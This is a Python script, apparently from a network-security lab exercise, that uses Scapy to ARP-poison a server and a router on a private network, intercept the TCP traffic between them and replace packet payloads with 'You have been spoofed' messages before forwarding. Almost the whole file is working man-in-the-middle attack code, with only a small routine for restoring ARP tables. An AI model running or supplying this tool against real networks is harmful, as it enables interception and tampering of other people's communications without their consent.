import threading
import time
import logging
from scapy.all import ARP, send, sniff, IP, TCP, Raw, conf, Ether, srp, sendp

def get_mac(ip):
    """
    Function to get the MAC address of a given IP
    :param ip: IP address
    :return: MAC address
    """
    try:
        # Create ARP request packet
        request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet = broadcast / request
        # Send the packet and get the response
        answer = srp(final_packet, timeout=5, verbose=0)[0]
        if not answer:
            print(f"No response for ARP request to {ip}")
            return None

        # Extract the MAC address from the response
        mac = answer[0][1].hwsrc
        return mac
    except Exception as e:
        print(f"Error getting MAC address for {ip}: {e}")
        return None

def restore_to_defaults(dest, source):
    """
    Function to restore the ARP table to its default state
    :param dest: Destination IP address
    :param source: Source IP address
    """
    target_mac = get_mac(dest)
    source_mac = get_mac(source)

    if target_mac and source_mac:
        # Create ARP packet to restore ARP table
        packet = ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
        send(packet, verbose=0)
        print(f"Restored ARP table for {dest}")

def arp_poison(victim_ip, victim_mac, spoof_ip):
    """
    Function to poison ARP table of a victim
    :param victim_ip: IP address of the victim
    :param victim_mac: MAC address of the victim
    :param spoof_ip: IP address to spoof
    """
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    send(packet, verbose=0)

def start_arp_poisoning(victim_ip, victim_mac, spoof_ip, stop_event):
    while not stop_event.is_set():
        try:
            arp_poison(victim_ip, victim_mac, spoof_ip)
        except Exception as e:
            print(f"Error in ARP poisoning: {e}")
        time.sleep(1)

def intercept_and_alter_packets(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP):
        print(packet)
        if packet[IP].src == router_ip and packet[IP].dst == server_ip:
            print("router to server")
            if packet.haslayer(Raw):
                print(f"RAW router to server with load: {packet[Raw].load}")
                altered_payload = b"You have been spoofed"
                packet[Raw].load = altered_payload
                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum
                packet.show2(dump=True)
                print(f"Altered packet: {packet}, altered payload:{packet[Raw].load}")
                sendp(packet, iface=iface, verbose=0)
                return
        elif packet[IP].src == server_ip and packet[IP].dst == router_ip:
            print("server to router")
            if packet.haslayer(Raw):
                print(f"RAW server to router with load: {packet[Raw].load}")
                altered_payload = b"You have been spoofed twice"
                packet[Raw].load = altered_payload
                del packet[IP].len
                del packet[IP].chksum
                del packet[TCP].chksum
                packet.show2(dump=True)
                print(f"Altered packet: {packet}, altered payload:{packet[Raw].load}")
                sendp(packet, iface=iface, verbose=1)
                return
    sendp(packet, iface=iface, verbose=False)

if __name__ == "__main__":
    client_ip = "172.7.0.2"
    server_ip = "198.7.0.2"
    router_ip = "198.7.0.1"
    middle_ip = "198.7.0.3"
    iface = "eth0"

    # Get MAC addresses
    server_mac = get_mac(server_ip)
    router_mac = get_mac(router_ip)
    
    if not server_mac or not router_mac:
        raise Exception("Could not get MAC addresses. Exiting...")

    print("Starting ARP poisoning...")

    # Event to signal stopping threads
    stop_event = threading.Event()

    # Starting threads for poisoning
    server_thread = threading.Thread(target=start_arp_poisoning, args=(server_ip, server_mac, router_ip, stop_event), daemon=True)
    router_thread = threading.Thread(target=start_arp_poisoning, args=(router_ip, router_mac, server_ip, stop_event), daemon=True)

    server_thread.start()
    router_thread.start()

    print("Starting packet interception...")
    sniff(prn=intercept_and_alter_packets, store=0)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping ARP poisoning...")
    finally:
        stop_event.set()
        server_thread.join()
        router_thread.join()
        print("Restoring ARP tables to default...")
        restore_to_defaults(server_ip, router_ip)
        restore_to_defaults(router_ip, server_ip)
        print("ARP poisoning stopped.")
